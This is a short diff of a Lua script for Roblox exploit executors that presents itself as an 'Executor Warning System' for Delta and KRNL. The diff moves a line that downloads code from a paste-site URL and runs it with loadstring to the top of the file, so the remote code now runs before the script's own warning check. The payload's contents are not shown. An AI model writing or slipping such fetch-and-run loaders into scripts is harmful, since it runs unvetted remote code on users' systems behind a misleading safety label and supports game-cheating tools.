@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/nwtxwHVW/raw"))()
 --// Executor Warning System (Delta & KRNL)
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
@@ -79,4 +80,3 @@ elseif string.find(executor, "Krnl") then
 else
     print("✅ Executor Safe:", executor)
 end
-loadstring(game:HttpGet("https://pastefy.app/nwtxwHVW/raw"))()
